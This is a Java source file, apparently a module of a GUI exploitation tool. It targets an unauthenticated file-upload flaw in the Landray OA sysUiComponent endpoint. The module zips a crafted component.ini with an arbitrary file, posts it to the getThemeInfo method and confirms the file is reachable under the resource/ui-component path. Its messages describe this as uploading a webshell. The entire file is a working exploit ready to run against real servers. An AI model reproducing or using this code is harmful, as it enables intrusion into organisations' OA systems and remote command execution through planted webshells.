package exp.oa.landrayoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.Methods;

import java.io.*;
import java.net.HttpURLConnection;
import java.util.HashMap;

public class landray_sysUiComponent_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    public static String sysUiComponent(String url,String filename){
        try {

            String fileini = "component.ini";
            String fileZip = "compressed.zip";
            String fileN = "";
            if(filename.equals("R4gUploadTest")){
                String var = "UEsDBBQACAgIAORSPlgAAAAAAAAAAAAAAAANAAAAY29tcG9uZW50LmluactMsTUyMDLmykvMTbUNMkkPSS0u0SupKAEAUEsHCOhd88caAAAAGAAAAFBLAwQUAAgICADkUj5YAAAAAAAAAAAAAAAACwAAAFI0Z1Rlc3QudHh0y0jNyclXCDJJTzHIyQEAUEsHCO8CHB0PAAAADQAAAFBLAQIUABQACAgIAORSPljoXfPHGgAAABgAAAANAAAAAAAAAAAAAAAAAAAAAABjb21wb25lbnQuaW5pUEsBAhQAFAAICAgA5FI+WO8CHB0PAAAADQAAAAsAAAAAAAAAAAAAAAAAVQAAAFI0Z1Rlc3QudHh0UEsFBgAAAAACAAIAdAAAAJ0AAAAAAA==";
                FileOutputStream fos = new FileOutputStream(fileZip);
                fos.write(java.util.Base64.getDecoder().decode(var));
                fos.close();
                fileN = "R4gTest.txt";
            }else {
                fileN = new File(filename).getName();
                String fileContent = "id=2023\n" + "name=" + fileN;

                File file = new File(fileini);
                File file1 = new File(fileZip);
                if (file.exists()) {
                    file.delete();
                }
                if (file1.exists()) {
                    file1.delete();
                }
                file.createNewFile();
                writeToFile(file, fileContent);

                String[] filesToZip = {fileini, filename};
                Methods.zipFiles(filesToZip, fileZip);
            }
            String flag = upload(url + "/sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo",fileZip);
            new File(fileini).delete();
            new File(fileZip).delete();
            if (flag=="success") {

                Response res1 = HttpTools.get(url + "/resource/ui-component/2023/"+fileN, new HashMap<>(), "utf-8");
                if (res1.getCode()==200) {
                    return url + "/resource/ui-component/2023/"+fileN;
                }
            }
        }catch (Exception e){
            return null;
        }
        new File("compressed.zip").delete();
        return null;
    }
    private static void writeToFile(File file, String content) throws IOException {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {
            writer.write(content);
        }
    }

    private static String upload(String url,String fileToRead){

        try {
            FileInputStream fileInputStream = new FileInputStream(fileToRead);

            HttpURLConnection connection = HttpTools.getCoon(url);
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=---------------------------267365731428755943603976921494");

            OutputStream outputStream = connection.getOutputStream();
            PrintWriter writer = new PrintWriter(new OutputStreamWriter(outputStream, "UTF-8"), true);

            writer.println("-----------------------------267365731428755943603976921494");
            writer.println("Content-Disposition: form-data; name=\"file\"; filename=\"compressed.zip\"");
            writer.println("Content-Type: application/x-zip-compressed");
            writer.println();

            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
            }

            writer.println();
            writer.println("-----------------------------267365731428755943603976921494--");
            writer.close();

            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                return "success";
            }

            connection.disconnect();
            fileInputStream.close();

        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private Boolean att(String url,TextArea textArea) {
        try {

            String result = sysUiComponent(url,"R4gUploadTest");


            if ( result != null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ landray_sysUiComponent_upload ]");
                    Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
                    textArea.appendText("\n 文件上传成功: \n"+result+" \n 访问成功: "+get.getText());

                    textArea.appendText("\n 请进行UPLOAD上传文件并ATT执行(*CMD栏为空)");
                    textArea.appendText("\n ");
                });


                return true;
            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }


    private Boolean attcmd(String url,String cmd, TextArea textArea,TextArea textArea_cmd) {
        try {
            File file = new File(cmd);
            if(!file.exists()){
                Platform.runLater(() -> {
                    textArea.appendText("\n 未找到文件");
                });
                return false;
            }
            String result = sysUiComponent(url,cmd);


            if ( result != null) {
                Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell上传成功: \n"+result);
                    textArea_cmd.appendText("\n "+ get.getText());
                });
                return true;


            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell文件上传失败，请手工测试");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell文件上传失败，请手工测试");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
